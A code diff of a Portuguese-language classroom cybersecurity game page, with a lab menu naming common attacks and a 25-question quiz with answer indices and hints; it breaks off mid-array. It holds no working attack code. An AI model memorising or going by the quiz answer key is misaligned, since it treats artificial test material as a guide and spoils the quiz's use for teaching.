-      <input type="text" id="inp-name" placeholder="Digite seu nome completo" maxlength="60">
-      <div style="margin-bottom:5px;"><label>SUA EQUIPE</label></div>
-      <div class="team-select">
-        <button class="team-btn" id="btn-red" onclick="selectTeam('red')">
-          <span class="team-icon">🔴</span>VERMELHA<br>
-          <small style="font-size:0.58rem;letter-spacing:1px;opacity:0.7;">ATAQUE</small>
-        </button>
-        <button class="team-btn" id="btn-blue" onclick="selectTeam('blue')">
-          <span class="team-icon">🔵</span>AZUL<br>
-          <small style="font-size:0.58rem;letter-spacing:1px;opacity:0.7;">DEFESA</small>
-        </button>
-      </div>
-      <div class="msg error" id="msg-error">⚠ Preencha todos os campos e selecione uma equipe.</div>
-      <div class="msg info" id="msg-info"></div>
-      <button class="btn-primary" onclick="doRegister()">[ ENTRAR NO CAMPO DE BATALHA ]</button>
+<!-- P0: LOGIN -->
+<div class="page active" id="p-login">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// SEGURANÇA DE SISTEMAS //</div></div>
+  <div class="panel blue">
+    <div class="panel-title">> identificação do agente</div>
+    <label>CÓDIGO DA TURMA</label>
+    <input type="password" id="inp-code" placeholder="Código fornecido pelo professor">
+    <label>SEU NOME COMPLETO</label>
+    <input type="text" id="inp-name" placeholder="Digite seu nome completo" maxlength="60">
+    <label>SUA EQUIPE</label>
+    <div class="team-select">
+      <button class="team-btn" id="btn-red" onclick="selectTeam('red')"><span class="t-icon">🔴</span>VERMELHA<br><small style="font-size:0.54rem;opacity:0.7;">ATAQUE</small></button>
+      <button class="team-btn" id="btn-blue" onclick="selectTeam('blue')"><span class="t-icon">🔵</span>AZUL<br><small style="font-size:0.54rem;opacity:0.7;">DEFESA</small></button>
     </div>
+    <div class="msg error" id="login-err"></div>
+    <div class="msg info" id="login-info"></div>
+    <button class="btn btn-blue" onclick="doLogin()">[ ENTRAR NO CAMPO DE BATALHA ]</button>
   </div>
+</div>
 
-  <!-- AGUARDANDO -->
-  <div id="screen-wait" style="display:none;">
-    <div class="panel blue-accent" style="text-align:center;">
-      <div id="badge-wait"></div>
+<!-- P1: AGUARDANDO -->
+<div class="page" id="p-wait">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// AGUARDANDO //</div></div>
+  <div class="panel blue">
+    <div style="text-align:center;padding:16px 0;">
+      <div id="wait-badge"></div>
       <span class="pulse" id="wait-icon">⚡</span>
-      <div class="wt-title" id="wait-title">AGUARDANDO INÍCIO</div>
-      <div class="wt-sub" id="wait-name"></div>
-      <div class="wt-sub" style="margin-top:6px;" id="wait-msg">O professor irá iniciar em breve...</div>
-      <div class="msg success" style="display:block;margin-top:16px;text-align:center;">
-        Agentes conectados: <span id="wait-count">0</span>
+      <div class="wt" id="wait-title">AGUARDANDO</div>
+      <div class="ws" id="wait-name"></div>
+      <div class="ws" id="wait-msg" style="margin-top:5px;"></div>
+      <div class="msg ok" style="display:block;margin-top:12px;">Agentes: <span id="wait-count">0</span></div>
+      <div class="lab-box" id="lab-box">
+        <div class="lab-box-title">🔬 LABORATÓRIO DISPONÍVEL</div>
+        <button class="btn btn-green" onclick="goToLab()">[ ACESSAR LABORATÓRIO ]</button>
       </div>
-      <!-- Laboratório disponível -->
-      <div class="lab-link-box" id="lab-box" style="display:none;">
-        <div class="lab-link-title">🔬 LABORATÓRIO DISPONÍVEL</div>
-        <button class="lab-link-btn" onclick="openLab()">[ ACESSAR LABORATÓRIO ]</button>
-      </div>
-      <!-- Aguardando reautorização -->
-      <div class="reauth-box" id="reauth-box" style="display:none;">
-        <div class="reauth-title">⏳ AGUARDANDO REAUTORIZAÇÃO</div>
-        <div class="reauth-desc">Sua reconexão foi detectada. Aguarde o professor autorizar seu reacesso no painel.</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- QUIZ -->
-  <div id="screen-quiz" style="display:none;">
-    <div class="score-bar">
-      <div class="score-item">
-        <div class="score-lbl">🔴 VERMELHA</div>
-        <div class="score-val red" id="q-sr">0</div>
-      </div>
-      <div class="score-sep">|</div>
-      <div class="score-item">
-        <div class="score-lbl">PERGUNTA</div>
-        <div class="score-val" id="q-prog" style="color:#4a6a8a;">0/25</div>
-      </div>
-      <div class="score-sep">|</div>
-      <div class="score-item">
-        <div class="score-lbl">🔵 AZUL</div>
-        <div class="score-val blue" id="q-sb">0</div>
-      </div>
-    </div>
-    <div class="panel red-accent" id="quiz-panel">
-      <div id="badge-quiz"></div>
-      <div class="prog-bar"><div class="prog-fill" id="q-pfill" style="width:0%"></div></div>
-      <div class="timer-wrap">
-        <div class="timer-circle" id="timer-circle"><span id="timer-disp">2:00</span></div>
-        <div class="timer-lbl">// TEMPO RESTANTE //</div>
-      </div>
-      <div class="q-counter" id="q-counter">PERGUNTA 1 DE 25</div>
-      <div class="q-text" id="q-text">Carregando...</div>
-      <div class="options" id="q-options"></div>
-      <button class="btn-hint" id="btn-hint" onclick="toggleHint()">[ VER DICA ]</button>
-      <div class="hint-box" id="hint-box"></div>
-      <button class="btn-send" id="btn-send" onclick="submitAnswer()" disabled>[ ENVIAR RESPOSTA ]</button>
-    </div>
-  </div>
-
-  <!-- FIM -->
-  <div id="end-screen">
-    <div class="panel green-accent">
-      <div class="end-title">🏁 FIM DA FASE 1</div>
-      <div class="wt-sub">Aguarde o professor para a próxima fase!</div>
-      <div class="final-scores">
-        <div class="fs-item"><div class="score-lbl">🔴 VERMELHA</div><div class="fs-val red" id="end-sr">0</div></div>
-        <div class="fs-item"><div class="score-lbl">🔵 AZUL</div><div class="fs-val blue" id="end-sb">0</div></div>
+      <div class="reauth-box" id="reauth-box">
+        <div style="font-family:var(--orb);font-size:0.6rem;letter-spacing:2px;color:var(--amber);margin-bottom:6px;">⏳ AGUARDANDO REAUTORIZAÇÃO</div>
+        <div class="ws">Aguarde o professor autorizar seu reacesso.</div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- RESULTADO -->
+<!-- P2: LABORATÓRIO -->
+<div class="page" id="p-lab">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// LABORATÓRIO DE SIMULAÇÃO DE ATAQUES //</div></div>
+  <div id="lab-menu">
+    <div class="lab-grid">
+      <div class="algo-card c-red" onclick="openAlgo('brute')"><div class="card-num">01/08</div><span class="card-icon">💀</span><div class="card-title">Brute Force</div><span class="card-tag tag-red">QUEBRA DE SENHA</span><div class="card-desc">Testa combinações até encontrar a senha.</div><div style="font-size:0.56rem;color:#2a4a6a;">5 passos →</div></div>
+      <div class="algo-card c-amber" onclick="openAlgo('sqli')"><div class="card-num">02/08</div><span class="card-icon">🗄️</span><div class="card-title">SQL Injection</div><span class="card-tag tag-amber">INJEÇÃO DE CÓDIGO</span><div class="card-desc">Manipulação de queries SQL via campos não validados.</div><div style="font-size:0.56rem;color:#2a4a6a;">5 passos →</div></div>
+      <div class="algo-card c-purple" onclick="openAlgo('xss')"><div class="card-num">03/08</div><span class="card-icon">💉</span><div class="card-title">XSS</div><span class="card-tag tag-purple">INJEÇÃO DE SCRIPT</span><div class="card-desc">JavaScript malicioso injetado em páginas web.</div><div style="font-size:0.56rem;color:#2a4a6a;">5 passos →</div></div>
+      <div class="algo-card c-blue" onclick="openAlgo('phish')"><div class="card-num">04/08</div><span class="card-icon">🎣</span><div class="card-title">Phishing</div><span class="card-tag tag-blue">ENGENHARIA SOCIAL</span><div class="card-desc">Construção de e-mail de phishing passo a passo.</div><div style="font-size:0.56rem;color:#2a4a6a;">5 passos →</div></div>
+      <div class="algo-card c-red" onclick="openAlgo('buffer')"><div class="card-num">05/08</div><span class="card-icon">💾</span><div class="card-title">Buffer Overflow</div><span class="card-tag tag-red">EXPLORAÇÃO DE MEMÓRIA</span><div class="card-desc">Invasão de áreas críticas da memória.</div><div style="font-size:0.56rem;color:#2a4a6a;">6 passos →</div></div>
+      <div class="algo-card c-red" onclick="openAlgo('ddos')"><div class="card-num">06/08</div><span class="card-icon">💥</span><div class="card-title">DDoS / Botnet</div><span class="card-tag tag-red">NEGAÇÃO DE SERVIÇO</span><div class="card-desc">Recrutamento de zumbis e ataque distribuído.</div><div style="font-size:0.56rem;color:#2a4a6a;">6 passos →</div></div>
+      <div class="algo-card c-purple" onclick="openAlgo('mitm')"><div class="card-num">07/08</div><span class="card-icon">👤</span><div class="card-title">Man in the Middle</div><span class="card-tag tag-purple">INTERCEPTAÇÃO</span><div class="card-desc">ARP Poisoning para interceptar comunicações.</div><div style="font-size:0.56rem;color:#2a4a6a;">5 passos →</div></div>
+      <div class="algo-card c-amber" onclick="openAlgo('ransom')"><div class="card-num">08/08</div><span class="card-icon">🔒</span><div class="card-title">Ransomware</div><span class="card-tag tag-amber">SEQUESTRO DE DADOS</span><div class="card-desc">Ciclo completo de infiltração e extorsão.</div><div style="font-size:0.56rem;color:#2a4a6a;">7 passos →</div></div>
+    </div>
+    <button class="btn btn-green" onclick="finishLab()">[ ✓ CONCLUÍ O LABORATÓRIO — CONTINUAR ]</button>
+  </div>
+  <div id="lab-algo-view" style="display:none;">
+    <div class="algo-topbar">
+      <button class="btn-back-lab" onclick="closeAlgo()">← VOLTAR</button>
+      <div style="font-family:var(--orb);font-size:0.75rem;color:#fff;" id="algo-title">—</div>
+      <span style="font-family:var(--mono);font-size:0.54rem;color:#2a4a6a;margin-left:auto;" id="algo-steps-lbl">0/0</span>
+    </div>
+    <div class="algo-split">
+      <div class="code-pane">
+        <div class="code-head"><div class="cdot" style="background:#ff5f56"></div><div class="cdot" style="background:#ffbd2e"></div><div class="cdot" style="background:#27c93f"></div><span class="cfname" id="algo-fname">arquivo.py</span></div>
+        <div class="code-scroll" id="algo-code"></div>
+        <div class="step-bar">
+          <button class="sbtn sbtn-p" id="algo-prev" onclick="algoStep(-1)">◀</button>
+          <button class="sbtn sbtn-n" id="algo-next" onclick="algoStep(1)">▶</button>
+          <button class="sbtn sbtn-r" onclick="algoReset()">↺</button>
+          <span class="step-num" id="algo-snum">0/0</span>
+        </div>
+      </div>
+      <div class="vis-pane" id="algo-vis"></div>
+    </div>
+  </div>
+</div>
+
+<!-- P3: QUIZ FASE 1 -->
+<div class="page" id="p-quiz">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// FASE 01 — QUIZ //</div></div>
+  <div class="score-bar">
+    <div class="sc-item"><div class="sc-lbl">🔴 VERMELHA</div><div class="sc-val red" id="q-sr">0</div></div>
+    <div class="sc-sep">|</div>
+    <div class="sc-item"><div class="sc-lbl">QUESTÃO</div><div class="sc-val" id="q-prog" style="color:#4a6a8a;">0/25</div></div>
+    <div class="sc-sep">|</div>
+    <div class="sc-item"><div class="sc-lbl">🔵 AZUL</div><div class="sc-val blue" id="q-sb">0</div></div>
+  </div>
+  <div class="panel red">
+    <div class="player-bar">
+      <span class="badge red" id="q-badge" style="margin:0;"></span>
+      <span style="font-family:var(--mono);font-size:0.68rem;color:var(--text);">👤 <span id="q-pname"></span></span>
+    </div>
+    <div class="prog-bar"><div class="prog-fill" id="q-pfill" style="width:0%"></div></div>
+    <div class="timer-wrap">
+      <div class="timer-circle" id="timer-circle"><span id="timer-disp">2:00</span></div>
+      <div class="timer-lbl">// TEMPO RESTANTE //</div>
+    </div>
+    <div class="q-counter" id="q-counter">QUESTÃO 1 DE 25</div>
+    <div class="q-text" id="q-text">Carregando...</div>
+    <div class="options" id="q-options"></div>
+    <button class="btn-hint" id="btn-hint" onclick="toggleHint()">[ VER DICA ]</button>
+    <div class="hint-box" id="hint-box"></div>
+    <button class="btn btn-green" id="btn-send" onclick="submitAnswer()" disabled style="margin-top:11px;">[ ENVIAR RESPOSTA ]</button>
+  </div>
+</div>
+
+<!-- P4: STANDBY F1→F2 -->
+<div class="page" id="p-standby1">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// FASE 1 CONCLUÍDA //</div></div>
+  <div class="panel green">
+    <div class="end-center">
+      <div class="end-icon">🏁</div>
+      <div class="end-title">FASE 1 CONCLUÍDA!</div>
+      <div class="final-scores">
+        <div class="fs-item"><div class="sc-lbl">🔴 VERMELHA</div><div class="fs-val red" id="sb1-sr">0</div></div>
+        <div class="fs-item"><div class="sc-lbl">🔵 AZUL</div><div class="fs-val blue" id="sb1-sb">0</div></div>
+      </div>
+      <div class="ws" style="margin-top:12px;">Aguardando o professor iniciar a Fase 2...</div>
+      <span class="pulse" style="margin-top:14px;">⚡</span>
+    </div>
+  </div>
+</div>
+
+<!-- P5: BATALHA FASE 2 -->
+<div class="page" id="p-battle">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// FASE 02 — BATALHA //</div></div>
+  <div class="score-bar">
+    <div class="sc-item"><div class="sc-lbl">🔴 ATAQUE</div><div class="sc-val red" id="b-sr">0</div></div>
+    <div class="sc-sep">|</div>
+    <div class="sc-item"><div class="sc-lbl">RODADA</div><div class="sc-val" id="b-round" style="color:#4a6a8a;">0/10</div></div>
+    <div class="sc-sep">|</div>
+    <div class="sc-item"><div class="sc-lbl">🔵 DEFESA</div><div class="sc-val blue" id="b-sb">0</div></div>
+  </div>
+  <div class="panel amber">
+    <div class="player-bar" style="margin-bottom:11px;">
+      <span class="badge" id="b-badge" style="margin:0;"></span>
+      <span style="font-family:var(--mono);font-size:0.68rem;color:var(--text);">👤 <span id="b-pname"></span></span>
+    </div>
+    <div class="rdot-row" id="b-dots"></div>
+    <div class="prog-bar"><div class="prog-fill" id="b-pfill" style="width:0%;background:linear-gradient(90deg,var(--red),var(--blue));"></div></div>
+    <div class="scenario-box">
+      <div class="sc-phase-lbl">// CENÁRIO //</div>
+      <div class="sc-name" id="b-sc-name">—</div>
+      <div class="sc-ctx" id="b-sc-ctx">—</div>
+    </div>
+    <div class="timer-wrap">
+      <div class="timer-circle" id="b-tc"><span id="b-td">1:30</span></div>
+      <div class="timer-lbl">// TEMPO PARA DECIDIR //</div>
+    </div>
+    <div id="b-choice-section">
+      <div class="panel-title" id="b-choice-title">> escolha sua ação</div>
+      <div class="choice-grid" id="b-choice-grid"></div>
+      <button class="btn btn-green" id="b-btn-send" onclick="submitVote()" disabled>[ CONFIRMAR VOTO ]</button>
+    </div>
+    <div id="b-voted-section" style="display:none;">
+      <div class="voted-msg">✓ VOTO REGISTRADO<br><span style="color:#4a6a8a;font-size:0.7rem;">Aguardando os demais agentes...</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- P6: FIM GERAL -->
+<div class="page" id="p-fim">
+  <div class="header"><div class="logo">CYBER BATTLE</div><div class="subtitle">// FIM DO JOGO //</div></div>
+  <div class="panel green">
+    <div class="end-center">
+      <div class="end-icon">🏆</div>
+      <div class="end-title">JOGO ENCERRADO!</div>
+      <div style="font-family:var(--mono);font-size:0.65rem;color:#4a6a8a;margin-bottom:14px;">PLACAR FINAL — FASE 1 + FASE 2</div>
+      <div class="final-scores">
+        <div class="fs-item"><div class="sc-lbl">🔴 VERMELHA</div><div class="fs-val red" id="fim-sr">0</div></div>
+        <div class="fs-item"><div class="sc-lbl">🔵 AZUL</div><div class="fs-val blue" id="fim-sb">0</div></div>
+      </div>
+      <div class="wt" id="fim-winner" style="margin-top:14px;">—</div>
+    </div>
+  </div>
+</div>
+
 <div id="result-overlay">
   <div class="res-icon" id="res-icon">🏆</div>
   <div class="res-title" id="res-title">RESULTADO</div>
@@ -217,359 +407,646 @@ input::placeholder{color:#2a4a6a;}
   <div class="res-winner" id="res-winner"></div>
 </div>
 
+
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, collection, serverTimestamp }
   from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-const firebaseConfig = {
-  apiKey:"AIzaSyAFEvYY-E0qJRVaAJZ30ODTZr1OW3R6aqw",
-  authDomain:"cyber-battle-game.firebaseapp.com",
-  projectId:"cyber-battle-game",
-  storageBucket:"cyber-battle-game.firebasestorage.app",
-  messagingSenderId:"330360546983",
-  appId:"1:330360546983:web:9093c120bafdcc31bd9d82"
-};
-const app = initializeApp(firebaseConfig);
-const db  = getFirestore(app);
+const FB={apiKey:"AIzaSyAFEvYY-E0qJRVaAJZ30ODTZr1OW3R6aqw",authDomain:"cyber-battle-game.firebaseapp.com",projectId:"cyber-battle-game",storageBucket:"cyber-battle-game.firebasestorage.app",messagingSenderId:"330360546983",appId:"1:330360546983:web:9093c120bafdcc31bd9d82"};
+const db=getFirestore(initializeApp(FB));
 
 const QUESTIONS=[
-  {q:"Qual das propriedades abaixo garante que apenas usuários autorizados possam consultar os recursos de um sistema?",opts:["Disponibilidade","Integridade","Confidencialidade","Irretratabilidade"],correct:2,hint:"Sou a parede que impede olhos curiosos de ler o que não lhes pertence."},
-  {q:"O princípio que diz que 'se um acesso não é explicitamente permitido, deve ser negado' é chamado de:",opts:["Privilégio mínimo","Default seguro","Mediação completa","Projeto aberto"],correct:1,hint:"Quando a regra não fala nada sobre você, a resposta já foi dada — e não foi 'sim'."},
-  {q:"Um sistema bancário que exige a autorização de dois gerentes para operações de alto valor é exemplo de qual princípio?",opts:["Economia de mecanismo","Compartilhamento mínimo","Separação de privilégios","Facilidade de uso"],correct:2,hint:"Uma chave sozinha não abre este cofre."},
-  {q:"Segundo o princípio do 'elo mais fraco', onde está o maior risco de segurança de um sistema?",opts:["No sistema operacional mais desatualizado","No elemento mais vulnerável, seja usuário, rede ou software","Sempre na conexão de rede","Nos servidores sem firewall"],correct:1,hint:"Uma corrente não é mais forte que sua peça mais frágil."},
-  {q:"O princípio que defende que o projeto de segurança deve ser simples o suficiente para ser facilmente testado e validado chama-se:",opts:["Proteção adequada","Eficiência","Economia de mecanismo","Compartilhamento mínimo"],correct:2,hint:"Na segurança, o simples é belo — e mais fácil de checar."},
-  {q:"Um processo que vasculha áreas de memória de outros processos buscando senhas e números de cartão de crédito é uma ameaça a qual propriedade?",opts:["Disponibilidade","Confidencialidade","Integridade","Autenticidade"],correct:1,hint:"Você não percebe, mas alguém está lendo sua correspondência."},
-  {q:"Um usuário que aloca toda a memória e processador do sistema para si, impedindo outros de usá-lo, ameaça qual propriedade?",opts:["Confidencialidade","Autenticidade","Integridade","Disponibilidade"],correct:3,hint:"Imagina um restaurante onde um único cliente come toda a comida antes dos outros chegarem."},
-  {q:"A propriedade que garante que nenhuma ação realizada no sistema pode ser negada por seu autor é conhecida como:",opts:["Autenticidade","Irretratabilidade","Confidencialidade","Disponibilidade"],correct:1,hint:"Assinou? Não tem como dizer que não foi você."},
-  {q:"Qual das alternativas melhor define uma vulnerabilidade de sistema?",opts:["Um ataque bem-sucedido ao sistema","Um defeito na especificação, implementação ou configuração que pode ser explorado","A ação de um atacante externo","Um programa malicioso instalado no sistema"],correct:1,hint:"Não é o ladrão, é a janela que ele encontrou aberta."},
-  {q:"O famoso 'Ping of Death' explora qual tipo de vulnerabilidade?",opts:["Ausência de senha de usuário","Estouro de buffer no protocolo ICMP","Falha de autenticação no servidor web","Falta de criptografia no banco de dados"],correct:1,hint:"Um 'olá' tão grande que derrubou quem tentou respondê-lo."},
-  {q:"O estouro de buffer (buffer overflow) é um erro especialmente comum em quais linguagens?",opts:["Python e Java","JavaScript e PHP","C e C++","Ruby e Kotlin"],correct:2,hint:"Linguagens que te dão liberdade total costumam cobrar um preço."},
-  {q:"Qual é a diferença principal entre DoS e DDoS?",opts:["DoS usa criptografia, DDoS não","DDoS usa múltiplos computadores (zumbis) simultâneos, DoS parte de uma única origem","DoS ataca dados, DDoS ataca a rede","Não há diferença técnica entre eles"],correct:1,hint:"Um é um punho. O outro é uma avalanche de punhos ao mesmo tempo."},
-  {q:"O ataque XSS (Cross-Site Scripting) geralmente ocorre em sites com qual tipo de falha?",opts:["Falta de criptografia HTTPS","Não validação de entrada de dados","Ausência de firewall","Senhas fracas no banco de dados"],correct:1,hint:"O porteiro não checou o que estava dentro da mala."},
-  {q:"No ataque XSS refletido, o código malicioso é:",opts:["Armazenado permanentemente no servidor","Injetado e executado imediatamente no navegador da vítima via URL ou campo","Enviado por e-mail diretamente","Instalado como extensão do navegador"],correct:1,hint:"Vai, volta e explode — tudo na mesma viagem."},
-  {q:"O que é Phishing?",opts:["Um ataque de força bruta contra senhas","Um ataque que usa engenharia social para induzir vítimas a fornecer dados confidenciais","Um tipo de vírus que criptografa arquivos","Um ataque de negação de serviço distribuído"],correct:1,hint:"Linha, anzol e isca — você é o peixe."},
-  {q:"O 'Spear Phishing' se diferencia do Phishing comum porque:",opts:["Usa SMS em vez de e-mail","É um ataque direcionado a uma vítima específica, com pesquisa prévia","Utiliza keyloggers","Só ocorre em redes corporativas"],correct:1,hint:"Não é uma rede jogada ao mar — é um atirador com mira."},
-  {q:"O Ransomware é um tipo de ataque que:",opts:["Monitora o tráfego de rede silenciosamente","Criptografa os dados da vítima e exige resgate para liberar o acesso","Redireciona o usuário para sites falsos","Instala anúncios indesejados no navegador"],correct:1,hint:"Seu arquivo estava aqui. Agora está trancado. Pague para ver a chave."},
-  {q:"O ataque 'Man in the Middle' consiste em:",opts:["Derrubar um servidor com requisições excessivas","Inserir-se de forma oculta numa comunicação entre duas partes, podendo interceptar ou alterar dados","Criar cópias falsas de sites legítimos","Explorar vulnerabilidades em APIs REST"],correct:1,hint:"Você achou que estava falando com seu banco. Alguém estava ouvindo tudo."},
-  {q:"A Engenharia Social em cibersegurança consiste em:",opts:["Programação avançada de exploits","Manipulação psicológica para obter informações ou acesso, explorando emoções e falhas humanas","Engenharia reversa de softwares","Ataque automatizado por robôs na rede"],correct:1,hint:"Nenhuma senha é necessária quando a própria pessoa abre a porta."},
-  {q:"Qual dos objetivos abaixo NÃO está entre os objetivos comuns de um ataque cibernético?",opts:["Mineração de criptomoedas","Espionagem","Melhorar a performance do sistema atacado","Negação de serviços (DoS)"],correct:2,hint:"Um desses itens foi colocado por um intruso bem-humorado."},
-  {q:"O que diferencia a Dark Web da Deep Web?",opts:["A Dark Web é indexada pelo Google, a Deep Web não","A Dark Web exige navegadores especializados como o Tor e é intencionalmente oculta; a Deep Web é apenas não indexada","A Deep Web é ilegal, a Dark Web é legal","Não há diferença entre elas"],correct:1,hint:"Uma é simplesmente não estar no mapa. A outra usa capa de invisibilidade."},
-  {q:"Os sites da Dark Web geralmente terminam com qual extensão de domínio?",opts:[".dark",".hidden",".onion",".tor"],correct:2,hint:"Pense em camadas. Muitas camadas."},
-  {q:"O Smishing é uma técnica de ataque que utiliza qual canal para enganar a vítima?",opts:["E-mail com anexo malicioso","Ligação telefônica com voz sintética","Mensagens de texto (SMS) com links para sites de phishing","Notificações falsas de aplicativos"],correct:2,hint:"Coube numa mensagem curta. Mas o estrago foi grande."},
-  {q:"O Vishing é uma variante de phishing que utiliza qual canal de comunicação?",opts:["E-mail","SMS","Ligações telefônicas com identificador de chamadas falso","Redes sociais"],correct:2,hint:"Sua voz é a chave. E alguém ligou pedindo emprestada."},
-  {q:"Um ataque que planta código malicioso em campos de comentários ou fóruns, ficando armazenado no servidor e afetando todos que acessam a página, é chamado de:",opts:["XSS Refletido","SQL Injection","XSS Armazenado","CSRF"],correct:2,hint:"Não é uma bomba que explode na hora — é uma armadilha plantada esperando as visitas."},
+  {q:"Qual propriedade garante que apenas usuários autorizados possam consultar os recursos de um sistema?",opts:["Disponibilidade","Integridade","Confidencialidade","Irretratabilidade"],correct:2,hint:"Sou a parede que impede olhos curiosos de ler o que não lhes pertence."},
+  {q:"O princípio 'se um acesso não é explicitamente permitido, deve ser negado' é chamado de:",opts:["Privilégio mínimo","Default seguro","Mediação completa","Projeto aberto"],correct:1,hint:"A resposta já foi dada — e não foi 'sim'."},
+  {q:"Sistema bancário que exige dois gerentes para operações exemplifica qual princípio?",opts:["Economia de mecanismo","Compartilhamento mínimo","Separação de privilégios","Facilidade de uso"],correct:2,hint:"Uma chave sozinha não abre este cofre."},
+  {q:"Segundo o 'elo mais fraco', onde está o maior risco?",opts:["No SO desatualizado","No elemento mais vulnerável: usuário, rede ou software","Na conexão de rede","Nos servidores sem firewall"],correct:1,hint:"Uma corrente não é mais forte que sua peça mais frágil."},
+  {q:"O princípio que defende que o projeto de segurança seja simples e fácil de testar chama-se:",opts:["Proteção adequada","Eficiência","Economia de mecanismo","Compartilhamento mínimo"],correct:2,hint:"Na segurança, o simples é belo."},
+  {q:"Processo que vasculha memória buscando senhas ameaça qual propriedade?",opts:["Disponibilidade","Confidencialidade","Integridade","Autenticidade"],correct:1,hint:"Alguém está lendo sua correspondência sem você saber."},
+  {q:"Usuário que aloca toda a memória impedindo outros de usar o sistema ameaça qual propriedade?",opts:["Confidencialidade","Autenticidade","Integridade","Disponibilidade"],correct:3,hint:"Um restaurante onde um único cliente come tudo antes dos outros chegarem."},
+  {q:"Propriedade que garante que nenhuma ação pode ser negada por seu autor:",opts:["Autenticidade","Irretratabilidade","Confidencialidade","Disponibilidade"],correct:1,hint:"Assinou? Não tem como dizer que não foi você."},
+  {q:"Melhor definição de vulnerabilidade de sistema:",opts:["Um ataque bem-sucedido","Um defeito na especificação, implementação ou configuração explorado","Ação de um atacante","Um programa malicioso instalado"],correct:1,hint:"Não é o ladrão, é a janela que ele encontrou aberta."},
+  {q:"O 'Ping of Death' explora qual vulnerabilidade?",opts:["Ausência de senha","Estouro de buffer no protocolo ICMP","Falha de autenticação","Falta de criptografia"],correct:1,hint:"Um olá tão grande que derrubou quem tentou respondê-lo."},
+  {q:"Buffer overflow é especialmente comum em quais linguagens?",opts:["Python e Java","JavaScript e PHP","C e C++","Ruby e Kotlin"],correct:2,hint:"Linguagens que te dão liberdade total costumam cobrar um preço."},
+  {q:"Principal diferença entre DoS e DDoS:",opts:["DoS usa criptografia","DDoS usa múltiplos computadores simultâneos, DoS parte de uma única origem","DoS ataca dados","Não há diferença"],correct:1,hint:"Um é um punho. O outro é uma avalanche de punhos ao mesmo tempo."},
+  {q:"XSS geralmente ocorre em sites com qual falha?",opts:["Falta de HTTPS","Não validação de entrada de dados","Ausência de firewall","Senhas fracas"],correct:1,hint:"O porteiro não checou o que estava dentro da mala."},
+  {q:"No XSS refletido, o código malicioso é:",opts:["Armazenado no servidor","Injetado e executado imediatamente no navegador via URL","Enviado por e-mail","Instalado como extensão"],correct:1,hint:"Vai, volta e explode — tudo na mesma viagem."},
+  {q:"O que é Phishing?",opts:["Ataque de força bruta","Engenharia social para induzir vítimas a fornecer dados","Vírus que criptografa arquivos","Ataque de negação de serviço"],correct:1,hint:"Linha, anzol e isca — você é o peixe."},
+  {q:"Spear Phishing se diferencia porque:",opts:["Usa SMS","É direcionado a vítima específica com pesquisa prévia","Utiliza keyloggers","Só ocorre em redes corporativas"],correct:1,hint:"Não é uma rede jogada ao mar — é um atirador com mira."},
+  {q:"Ransomware é um ataque que:",opts:["Monitora tráfego silenciosamente","Criptografa dados e exige resgate","Redireciona para sites falsos","Instala anúncios indesejados"],correct:1,hint:"Seu arquivo estava aqui. Agora está trancado. Pague para ver a chave."},
+  {q:"Man in the Middle consiste em:",opts:["Derrubar um servidor","Inserir-se ocultamente numa comunicação entre duas partes","Criar cópias falsas de sites","Explorar APIs"],correct:1,hint:"Você achava que estava falando com seu banco. Alguém estava ouvindo tudo."},
+  {q:"Engenharia Social é:",opts:["Programação de exploits","Manipulação psicológica para obter informações ou acesso","Engenharia reversa","Ataque automatizado"],correct:1,hint:"Nenhuma senha é necessária quando a própria pessoa abre a porta."},
+  {q:"Qual objetivo NÃO está entre os comuns de um ataque cibernético?",opts:["Mineração de criptomoedas","Espionagem","Melhorar a performance do sistema atacado","Negação de serviços"],correct:2,hint:"Um desses itens foi colocado por um intruso bem-humorado."},
+  {q:"O que diferencia Dark Web da Deep Web?",opts:["Dark Web é indexada pelo Google","Dark Web exige Tor e é intencionalmente oculta; Deep Web é apenas não indexada","Deep Web é ilegal","Não há diferença"],correct:1,hint:"Uma não está no mapa. A outra usa capa de invisibilidade."},
+  {q:"Sites da Dark Web geralmente terminam com:",opts:[".dark",".hidden",".onion",".tor"],correct:2,hint:"Pense em camadas. Muitas camadas."},
+  {q:"Smishing utiliza qual canal?",opts:["E-mail com anexo","Ligação com voz sintética","SMS com links de phishing","Notificações falsas"],correct:2,hint:"Coube numa mensagem curta. Mas o estrago foi grande."},
+  {q:"Vishing é variante de phishing que usa:",opts:["E-mail","SMS","Ligações telefônicas com identificador falso","Redes sociais"],correct:2,hint:"Sua voz é a chave. E alguém ligou pedindo emprestada."},
+  {q:"Ataque que planta código em comentários armazenado no servidor afetando todos os visitantes:",opts:["XSS Refletido","SQL Injection","XSS Armazenado","CSRF"],correct:2,hint:"Armadilha plantada esperando as visitas."},
 ];
 
-// ── ESTADO ─────────────────────────────────────
-let playerName='', playerTeam='', playerId='', sessionToken='';
-let currentQ=0, selectedOpt=null, answered=false;
-let timerInterval=null, timeLeft=120, questionStartTime=0;
-let gameStarted=false, labUrl='';
+const SCENARIOS=[
+  {name:"Servidor Web Corporativo",ctx:"Empresa de e-commerce com loja online"},
+  {name:"Rede Interna da Empresa",ctx:"Escritório corporativo com 200 funcionários"},
+  {name:"E-mail Corporativo",ctx:"Funcionários recebem centenas de e-mails por dia"},
+  {name:"Banco de Dados de Clientes",ctx:"Sistema financeiro com dados de 50 mil clientes"},
+  {name:"VPN Corporativa",ctx:"Equipe em trabalho remoto acessando sistemas internos"},
+  {name:"Aplicativo Mobile Bancário",ctx:"App de banco usado por milhões de clientes"},
+  {name:"Rede Wi-Fi Pública",ctx:"Funcionário trabalhando em aeroporto/café"},
+  {name:"Sistema de Backup",ctx:"Data center com backups de dados críticos"},
+  {name:"Redes Sociais Corporativas",ctx:"Perfil oficial da empresa com 100k seguidores"},
